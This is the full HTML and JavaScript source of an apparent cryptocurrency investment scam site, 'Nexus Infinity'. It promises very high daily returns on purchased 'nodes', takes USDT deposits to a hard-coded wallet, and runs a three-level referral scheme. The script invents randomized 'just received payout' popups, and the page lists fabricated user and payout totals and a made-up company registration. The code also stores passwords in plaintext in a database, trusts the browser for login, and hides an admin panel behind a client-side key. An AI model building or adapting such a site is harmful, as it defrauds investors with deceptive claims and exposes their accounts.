<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Apex Global Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root { --neon-red: #ff003c; --neon-pink: #ff00ff; --black: #050505; --glass: rgba(15, 15, 15, 0.85); }
        body { background: var(--black); color: white; font-family: 'Plus Jakarta Sans', sans-serif; overflow-x: hidden; }

        /* Ticker Animation */
        .ticker-wrap { background: rgba(255, 0, 60, 0.1); border-bottom: 1px solid rgba(255, 0, 60, 0.2); overflow: hidden; white-space: nowrap; padding: 10px 0; }
        .ticker { display: inline-block; animation: ticker 30s linear infinite; font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* Pop-up Notification */
        #activity-pop { position: fixed; bottom: 100px; left: 20px; background: white; color: black; padding: 10px 20px; border-radius: 15px; font-size: 10px; font-weight: 800; display: none; z-index: 9999; box-shadow: 0 10px 30px rgba(255,0,60,0.3); animation: slideUp 0.5s ease; }
        @keyframes slideUp { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

        .glass-panel { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 30px; }
        .btn-apex { background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); color: white; font-weight: 800; padding: 16px; border-radius: 18px; transition: 0.3s; text-align: center; width: 100%; border: none; }
        .input-dark { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 15px; padding: 15px; color: white; outline: none; width: 100%; font-size: 13px; }
        
        .nav-item { color: #555; text-align: center; cursor: pointer; transition: 0.3s; }
        .nav-item.active { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red); }
        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker">
            BTC/USDT $64,231.50 <span class="text-green-500">▲ +1.2%</span> &nbsp;&nbsp;&nbsp; 
            ETH/USDT $3,450.12 <span class="text-red-500">▼ -0.5%</span> &nbsp;&nbsp;&nbsp; 
            TRX/USDT $0.1210 <span class="text-green-500">▲ +3.4%</span> &nbsp;&nbsp;&nbsp; 
            GLOBAL USERS: 1,240,512 &nbsp;&nbsp;&nbsp;
            TOTAL PAYOUTS: $42,401,900
        </div>
    </div>

    <div id="activity-pop"><i class="fa-solid fa-circle-check text-green-500 mr-2"></i> <span id="pop-text">User Alex*** just received $450 payout!</span></div>

    <div id="splash" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-[#ff003c] to-[#ff00ff] rounded-[2rem] flex items-center justify-center text-5xl font-black shadow-[0_0_50px_rgba(255,0,60,0.4)]">N</div>
        <h1 style="font-family: 'Syncopate'" class="text-white mt-6 text-sm tracking-widest">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
    </div>

    <div id="auth-section" class="min-h-screen p-8 flex flex-col justify-center hidden">
        <div class="max-w-sm mx-auto w-full space-y-10">
            <div id="logo-tap" class="text-center">
                <div class="w-20 h-20 bg-zinc-900 mx-auto rounded-3xl flex items-center justify-center text-4xl font-black border border-white/10 mb-4">N</div>
                <p class="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Global Institutional Node Network</p>
            </div>
            
            <div id="login-ui" class="space-y-4">
                <input type="text" id="l-user" placeholder="Terminal ID" class="input-dark">
                <input type="password" id="l-pass" placeholder="Security Key" class="input-dark">
                <button onclick="handleLogin()" class="btn-apex">Authorize Entry</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] font-bold text-zinc-500 uppercase cursor-pointer">Register Identity</p>
            </div>

            <div id="signup-ui" class="space-y-4 hidden">
                <input type="text" id="s-user" placeholder="Create Username" class="input-dark">
                <input type="password" id="s-pass" placeholder="Create Key" class="input-dark">
                <button onclick="handleSignup()" class="btn-apex">Initialize Node</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] font-bold text-zinc-500 uppercase cursor-pointer">Back to Login</p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-28">
        <nav class="p-6 border-b border-white/5 sticky top-0 bg-black/50 backdrop-blur-xl z-[500] flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-10 h-10 bg-zinc-900 rounded-xl flex items-center justify-center font-black border border-white/5">N</div>
                <span id="nav-user" class="text-sm font-black italic tracking-tighter uppercase">...</span>
            </div>
            <div class="flex gap-4">
                <i onclick="alert('24/7 Support: @NexusGlobal_Bot')" class="fa-solid fa-headset text-zinc-500"></i>
                <i onclick="logout()" class="fa-solid fa-power-off text-zinc-500"></i>
            </div>
        </nav>

        <div id="page-home" class="p-6 space-y-6">
            <div class="glass-panel p-8 bg-gradient-to-br from-zinc-900 to-black border-t border-white/10">
                <p class="text-[9px] font-black text-zinc-500 uppercase tracking-[0.3em] mb-2">Portfolio Valuation</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-8 flex justify-between items-end">
                    <div>
                        <p class="text-[8px] font-black text-zinc-500 mb-1">AGGREGATED PROFIT</p>
                        <p id="profit-txt" class="text-xl font-black text-[#ff00ff]">+$0.00</p>
                    </div>
                    <div class="text-right">
                        <p class="text-[8px] font-black text-zinc-500 mb-1">SYSTEM STATUS</p>
                        <p class="text-[10px] font-black text-green-500"><i class="fa-solid fa-circle-dot animate-pulse mr-1"></i> SYNCED</p>
                    </div>
                </div>
            </div>

            <div class="flex justify-between items-center">
                <h3 class="text-[10px] font-black text-zinc-500 uppercase">Live Node Deployments</h3>
                <span class="text-[8px] text-zinc-500">Updated: Just Now</span>
            </div>
            <div id="active-nodes-list" class="space-y-4"></div>
        </div>

        <div id="page-nodes" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-6 bg-zinc-900/50">
                <h3 class="text-[10px] font-black uppercase text-[#ff003c] mb-4">Yield Calculator</h3>
                <div class="flex gap-3">
                    <input type="number" id="calc-input" oninput="calculateProfit()" placeholder="Amount ($)" class="input-dark flex-1">
                    <div class="bg-black/50 p-3 rounded-xl min-w-[100px] text-center border border-white/5">
                        <p class="text-[8px] text-zinc-500">45D Return</p>
                        <p id="calc-res" class="text-sm font-black text-green-500">$0.00</p>
                    </div>
                </div>
            </div>

            <div id="nodes-market" class="grid gap-4"></div>
        </div>

        <div id="page-finance" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-6 space-y-5">
                <h3 class="text-sm font-black italic">CAPITAL INJECTION</h3>
                <div class="bg-black/60 p-4 rounded-2xl border border-white/5">
                    <p class="text-[8px] text-zinc-500 mb-1 uppercase font-black">Recharge Address (USDT TRC20)</p>
                    <p class="text-[10px] font-bold text-[#ff00ff] break-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Injection Amount ($)" class="input-dark">
                <input type="text" id="dep-tid" placeholder="Blockchain TID" class="input-dark">
                <button onclick="submitDep()" class="btn-apex">Authorize Deposit</button>
            </div>
            
            <div class="glass-panel p-6 space-y-4">
                <h3 class="text-sm font-black italic">SECURE WITHDRAWAL</h3>
                <input type="number" id="w-amt" placeholder="Amount ($)" class="input-dark">
                <input type="text" id="w-addr" placeholder="Wallet Address" class="input-dark">
                <button onclick="submitWith()" class="btn-apex !bg-zinc-800">Request Payout</button>
            </div>
        </div>

        <div id="page-menu" class="p-6 space-y-6 hidden">
            <div class="glass-panel p-6 space-y-4">
                <h3 class="text-[10px] font-black text-[#ff003c] uppercase">Institutional Referral</h3>
                <div class="grid grid-cols-3 gap-2">
                    <div class="bg-black p-3 rounded-xl text-center border border-white/5">
                        <p class="text-[7px] text-zinc-500">L-1</p>
                        <p class="text-[10px] font-black">10%</p>
                    </div>
                    <div class="bg-black p-3 rounded-xl text-center border border-white/5">
                        <p class="text-[7px] text-zinc-500">L-2</p>
                        <p class="text-[10px] font-black">5%</p>
                    </div>
                    <div class="bg-black p-3 rounded-xl text-center border border-white/5">
                        <p class="text-[7px] text-zinc-500">L-3</p>
                        <p class="text-[10px] font-black">2%</p>
                    </div>
                </div>
                <input id="ref-link" readonly class="input-dark !py-3 !text-[10px] border-none text-center">
                <button onclick="copyRef()" class="w-full bg-white text-black py-3 rounded-xl text-[10px] font-black">COPY LINK</button>
            </div>

            <div class="space-y-2">
                <div onclick="alert('Company: Nexus Infinity Ltd\nReg No: DXB-2026-786\nOffice: Silicon Oasis, Dubai.')" class="glass-panel p-5 text-[10px] font-black flex justify-between"><span>COMPANY DETAILS</span> <i class="fa-solid fa-chevron-right"></i></div>
                <div onclick="alert('Privacy Policy:\n- 256-bit Encryption\n- 2FA Integration\n- Instant Settlement')" class="glass-panel p-5 text-[10px] font-black flex justify-between"><span>LEGAL PROTOCOLS</span> <i class="fa-solid fa-chevron-right"></i></div>
                <div onclick="alert('Min Dep: $10\nMin With: $5\nTime: 2h to 24h')" class="glass-panel p-5 text-[10px] font-black flex justify-between"><span>GLOBAL FAQ</span> <i class="fa-solid fa-chevron-right"></i></div>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-2xl border-t border-white/5 p-5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item active"><i class="fa-solid fa-shield-halved text-xl mb-1"></i><p class="text-[8px] font-black">CORE</p></div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-microchip text-xl mb-1"></i><p class="text-[8px] font-black">NODES</p></div>
            <div onclick="switchPage('finance')" class="nav-item"><i class="fa-solid fa-vault text-xl mb-1"></i><p class="text-[8px] font-black">VAULT</p></div>
            <div onclick="switchPage('menu')" class="nav-item"><i class="fa-solid fa-globe text-xl mb-1"></i><p class="text-[8px] font-black">TRUST</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black italic text-[#ff003c]">MASTER OVERRIDE</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-3xl">&times;</button>
        </div>
        <div id="admin-dep-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Nodes Configuration
        const nodesData = [
            ...Array.from({length: 10}, (_, i) => ({ id: i+1, type: 'Standard', title: `Standard Node 0${i+1}`, price: (i+1)*30, daily: ((i+1)*2.4).toFixed(2), days: 30 })),
            ...Array.from({length: 5}, (_, i) => ({ id: i+11, type: 'Apex', title: `Apex Alpha-0${i+1}`, price: (i+1)*400, daily: ((i+1)*42).toFixed(2), days: 45 }))
        ];

        window.onload = () => {
            renderNodes();
            startFomoPopups();
            setTimeout(() => {
                document.getElementById('splash').style.display = 'none';
                const u = localStorage.getItem('nexus_user');
                if(u) showDashboard(u);
                else document.getElementById('auth-section').classList.remove('hidden');
            }, 2500);
        };

        function renderNodes() {
            document.getElementById('nodes-market').innerHTML = nodesData.map(n => `
                <div class="glass-panel p-6 flex justify-between items-center ${n.type === 'Apex' ? 'border-[#ff003c]' : ''}">
                    <div>
                        <p class="text-[7px] font-black ${n.type === 'Apex' ? 'text-[#ff003c]' : 'text-zinc-500'} uppercase mb-1">${n.type} Tier</p>
                        <h4 class="text-xl font-extrabold italic">${n.title}</h4>
                        <p class="text-[9px] font-black text-green-500 mt-1">Daily ROI: $${n.daily}</p>
                    </div>
                    <div class="text-right">
                        <p class="text-lg font-black italic">$${n.price}</p>
                        <button onclick="buyNode(${n.id})" class="bg-white text-black px-5 py-2 rounded-xl text-[9px] font-black uppercase mt-2">Deploy</button>
                    </div>
                </div>
            `).join('');
        }

        window.calculateProfit = () => {
            const amt = document.getElementById('calc-input').value;
            document.getElementById('calc-res').innerText = '$' + (amt * 2.8).toFixed(2);
        };

        function startFomoPopups() {
            const users = ['Alex***', 'Sarah***', 'Crypto***', 'King***', 'User99***', 'NodeMaster***'];
            const amounts = [120, 50, 1000, 450, 30, 2500];
            setInterval(() => {
                const u = users[Math.floor(Math.random() * users.length)];
                const a = amounts[Math.floor(Math.random() * amounts.length)];
                document.getElementById('pop-text').innerText = `User ${u} just received $${a} payout!`;
                document.getElementById('activity-pop').style.display = 'block';
                setTimeout(() => document.getElementById('activity-pop').style.display = 'none', 3000);
            }, 10000);
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user');
            const node = nodesData.find(n => n.id === id);
            const snap = await get(ref(db, `users/${user}`));
            const bal = snap.val().balance || 0;
            if(bal < node.price) return alert("Insufficient Capital.");
            await update(ref(db, `users/${user}`), { balance: bal - node.price });
            await push(ref(db, `users/${user}/activeNodes`), { ...node, startTime: Date.now(), expiry: Date.now() + (node.days * 86400000) });
            alert("Protocol Deployed Successfully.");
            switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('ref-link').value = window.location.origin + "/?ref=" + uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const data = snap.val();
                if(!data) return;
                document.getElementById('balance-txt').innerText = '$' + (data.balance || 0).toLocaleString();
                document.getElementById('profit-txt').innerText = '+$' + (data.profit || 0).toLocaleString();
                
                if(data.activeNodes) {
                    document.getElementById('active-nodes-list').innerHTML = Object.values(data.activeNodes).map(n => {
                        const hoursLeft = Math.floor((n.expiry - Date.now()) / 3600000);
                        return `
                        <div class="glass-panel p-5 border-l-4 border-[#ff003c]">
                            <div class="flex justify-between items-center mb-3">
                                <p class="text-[9px] font-black uppercase text-white">${n.title}</p>
                                <span class="text-[7px] text-green-500 font-black animate-pulse">● ACTIVE</span>
                            </div>
                            <div class="flex justify-between">
                                <div><p class="text-[6px] text-zinc-500">YIELD CYCLE</p><p class="text-xs font-black italic text-[#ff003c]">${hoursLeft}H Remaining</p></div>
                                <div class="text-right"><p class="text-[6px] text-zinc-500">DAILY RETURN</p><p class="text-xs font-black text-white">$${n.daily}</p></div>
                            </div>
                        </div>`;
                    }).join('');
                }
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            if(!amt || !tid) return alert("All Protocol Data Required.");
            const entry = { user, amount: amt, tid, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit' };
            const hRef = push(ref(db, `users/${user}/history`));
            await set(hRef, entry);
            await set(ref(db, `admin/deposits/${hRef.key}`), entry);
            alert("Verification Protocol Initiated.");
        };

        // Admin Secret
        let tapCount = 0;
        document.getElementById('admin-trigger').onclick = document.getElementById('logo-tap').onclick = () => {
            tapCount++;
            if(tapCount === 4) {
                if(prompt("Security Key:") === "coin786") document.getElementById('admin-panel').classList.remove('hidden');
                tapCount = 0;
            }
            setTimeout(() => tapCount = 0, 2000);
        };

        window.handleSignup = async () => {
            const u = document.getElementById('s-user').value.trim();
            const p = document.getElementById('s-pass').value.trim();
            if(!u || !p) return alert("Fields Empty.");
            await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 });
            alert("ID Synchronized."); toggleAuth(false);
        };

        window.handleLogin = async () => {
            const u = document.getElementById('l-user').value.trim();
            const p = document.getElementById('l-pass').value.trim();
            const snap = await get(ref(db, `users/${u}`));
            if(snap.exists() && snap.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); }
            else alert("Unauthorized Access.");
        };

        window.switchPage = (p) => {
            ['home', 'nodes', 'finance', 'menu'].forEach(pg => document.getElementById('page-'+pg).classList.add('hidden'));
            document.getElementById('page-'+p).classList.remove('hidden');
            document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
            if(event) event.currentTarget.classList.add('active');
        };

        window.toggleAuth = (s) => {
            document.getElementById('login-ui').classList.toggle('hidden', s);
            document.getElementById('signup-ui').classList.toggle('hidden', !s);
        };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.copyRef = () => { document.getElementById('ref-link').select(); document.execCommand('copy'); alert("Link Copied!"); };
    </script>
</body>
</html>
